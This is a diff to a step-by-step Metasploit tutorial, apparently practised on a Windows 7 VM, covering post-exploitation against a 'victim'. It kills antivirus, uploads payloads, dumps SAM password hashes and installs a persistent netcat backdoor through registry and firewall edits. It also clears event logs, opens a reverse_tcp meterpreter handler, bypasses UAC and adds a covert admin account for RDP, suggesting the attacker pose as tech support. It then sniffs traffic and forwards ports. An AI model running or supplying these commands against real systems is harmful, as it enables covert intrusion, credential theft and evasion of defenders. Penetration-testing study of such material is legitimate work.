@@ -793,7 +793,7 @@ good for any user as anything will install without them knowing. Also this is no
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-STEP #13: MAINTAINING A PERSISTANT BACKDOOR IN WINDOWS 7
+STEP #13: MAINTAINING A PERSISTENT BACKDOOR IN WINDOWS 7
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 These steps are a continuation from step #12. They can also be used in XP and its possible that it will work with Windows 8 and 10.
 
@@ -803,15 +803,14 @@ These steps are a continuation from step #12. They can also be used in XP and it
 	b.	Type getprivs
 		i.	…lists the process privileges
 	c.	Type killav
-
 		i.	…kills all Antivirus services running
+
 -------------------------------------------------------------------------------------------------------------------------------
 Note: We can also use the incognito command along with its options and steal tokens to get System level rights… Google what
 incognito is and what it does
 -------------------------------------------------------------------------------------------------------------------------------
 
-19.	Upload the payload to the victim’s machine. My original evildoer file which gave use the meterpreter shell was in the Downloads
-folder therefore when I upload this file it will go to that folder…
+19.	Upload the payload to the victim’s machine. My original evildoer file which gave use the meterpreter shell was in the Downloads folder therefore when I upload this file it will go to that folder…
 	a.	Type pwd to find out where you are in the victim’s directory
 	b.	Type upload –f payload.exe c:\\users\\<username>\\downloads
 		i.	…no, the \\ are NOT typos…check the message after uploading to see how they work
@@ -847,8 +846,8 @@ Note: If you misplace an uploaded file use the where command in Windows shell to
 		i.	…you’re back in meterpreter
 
 -------------------------------------------------------------------------------------------------------------------------------
-Note: Did you know that you can dir to the victim from meterpreter without being in shell? Did you also noticed that this sentence
-made sense to you?!
+Note: Did you know that you can dir to the victim from meterpreter without being in shell? Did you also noticed that this
+sentence made sense to you?!
 -------------------------------------------------------------------------------------------------------------------------------
 
 25.	These two commands are useful to have and only work from meterpreter and not from inside the Windows shell
@@ -868,9 +867,9 @@ made sense to you?!
 	b.	Type cat curr_user.txt
 
 -------------------------------------------------------------------------------------------------------------------------------
-Note: I tried writing a small BASH script and found out that using a text editor like nano from within msfconsole will crash/freeze
-the session even if you put it in the background. If this happens to you don’t forget to check how many sessions you have running
-when you return to what you were doing; also kill any unused sessions that may be running
+Note: I tried writing a small BASH script and found out that using a text editor like nano from within msfconsole will
+crash/freeze the session even if you put it in the background. If this happens to you don’t forget to check how many sessions
+you have running when you return to what you were doing; also kill any unused sessions that may be running
 -------------------------------------------------------------------------------------------------------------------------------
 
 28.	Let’s try and get a hash dump to get into the system’s SAM file which holds all users and their keys…this may disconnect you
@@ -904,6 +903,7 @@ Note: XP uses NT, Windows 7 and later uses NTLM
 	b.	Type shell
 		i.	...it will show you a “Failed to spawn” error but it connected anyway
 	c.	Type exit
+		i.	…we’re back in meterpreter
 
 33.	Now we upload netcat and do some registry editing so we can maintain a persistent connection…
 	a.	Type upload –f /usr/share/windows-binaries/nc.exe c:\\windows\\system32
@@ -925,17 +925,18 @@ Also optional, you can do a port scan (nmap –sS <victim_ip_address> -vv ) to c
 		ii.	…deprecated but still works
 	c.	Type netsh advfirewall firewall
 		i.	…for more options
-	d.	Type netsh advfirewall firewall add rule name=”netcat” protocol=tcp localport=31337 dir=in action=allow program=”c:\windows\system32\nc.exe”
+	d.	Type netsh advfirewall firewall add rule name=”netcat” protocol=tcp localport=31337 dir=in action=allow program=”c:\windows\system32\nc.exe” enable=yes
 		i.	…adds the rule
 	e.	Type netsh advfirewall firewall show rule netcat
 		i.	…to confirm
+	f.	Type exit
+		i.	…exit shell and back to meterpreter
 
 -------------------------------------------------------------------------------------------------------------------------------
-Note: If you’re victim is tech-savvy and has a sandbox program protecting c:\ then uploading may not work
+Note: If you’re victim is tech-savvy and has a sandbox program protecting the c:\ drive then uploading may not work
 -------------------------------------------------------------------------------------------------------------------------------
 
-35.	Before we log out and reboot the Windows VM…
-	a.	Type clearev
+35.	Type clearev
 		i.	…clears the Application, System and Security logs at the victim’s machine…not really stealthy but will do the job
 
 36.	Now reboot the Windows VM
@@ -954,3 +955,96 @@ Note: If you’re victim is tech-savvy and has a sandbox program protecting c:\ 
 -------------------------------------------------------------------------------------------------------------------------------
 Note: You can also use telnet…type telnet <victim_ip_address> port
 -------------------------------------------------------------------------------------------------------------------------------
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #14: RUN A GUI BACKDOOR IN WINDOWS 7
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This step continues from step #13. We’ll start a remote GUI from the Windows machine that runs without the victim’s knowledge.
+
+1.	Close out of nc or telnet
+
+2.	Run the evilfile.exe exploit
+
+3.	Type use exploit/multi/handler
+	a.	Type set payload windows/meterpreter/reverse_tcp
+	b.	Type set lport 443
+	c.	Type set lhost <victim_ip_address>
+		i.	…victim not Kali
+	d.	Type options …to verify
+	e.	Type run or exploit
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: If you already have access to get System rights (getsystem) then you don’t have to background this session…if you don’t
+then background then use the bypassuac exploit and continue
+-------------------------------------------------------------------------------------------------------------------------------
+	f.	Optional…
+	g.	Type background …to background the session
+		i.	…write down the session number
+	h.	Type use exploit/windows/local/bypassuac
+	i.	Type set session # …to background session number
+	j.	Type run
+	k.	Type getsystem
+	l.	Type sessions …and get back to the background session to continue
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: If you cannot run the first payload because you saved an msf configuration, then go to the path that shows up when you
+use the save command and delete the entire hidden folder using the rm –rf command
+-------------------------------------------------------------------------------------------------------------------------------
+
+4.	In meterpreter…
+	a.	Type getgui –h
+	b.	Type run getgui –u evildoer2 –p P@$$w0rd!
+		i.	…works like adding a new user using net user command in shell and adds the new user to the admin group
+		ii.	…creates a custom script to cleanup after you are done…but its flawed and we have to go into the script to fix it
+
+5.	Go to a new terminal and…
+	a.	Type rdesktop –u evildoer2 –p P@$$w0rd! <victim_ip_address>
+		i.	…sometimes the password won’t take, enter it manually
+		ii.	…a bad thing about this is that it will prompt the logged user to disconnect but you can work with this by pretending to be tech support
+
+6.	Optional…go to meterpreter then type shell
+	a.	Type net user …to verify your new user is there
+	b.	Type exit …to exit the shell
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #15: SNIFFING WINDOWS 7
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This step continues from step #14. Clear meterpreter but do not log-off. Also close any additional terminal screens.
+
+1.	Type use sniffer
+	a.	Type help
+	b.	Type sniffer_interfaces
+		i.	…notice their status…one of them is the real WiFi or Ethernet connection if that’s what you’re using…read them carefully
+	c.	Type sniffer_start #
+		i.	…where the # is the correct interface number to be used
+	d.	Type sniffer_stop #
+	e.	Type sniffer_dump # ./Desktop/sniffer.cap
+
+2.	Open Wireshark…
+	a.	Go to File>Open and find the .cap file in the Desktop
+		i.	…now you can inspect the file based on filters like IPs, Protocols, TCP ports, etc…
+
+3.	On the Apply a display filter box…
+	a.	Type ip.addr == 192.168.149.128
+	b.	Click on the arrow at the end of the box or hit enter
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #16: PORT FORWARDING
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This step continues from step #15. Clear meterpreter but do not log-off. Also close any additional terminal screens or programs
+
+1.	While in meterpreter…
+	a.	Type portfwd –h
+	b.	Type portfwd add –l 445 –p 445 –r  <victim_ip_address>
+	c.	Type portfwd list
+
+2.	Open a new terminal screen…
+	a.	Type netstat –an|grep 445
+	b.	Type telnet localhost 445
+
+3.	Back in meterpreter…
+	a.	Type portfwd flush
+		i.	…to close
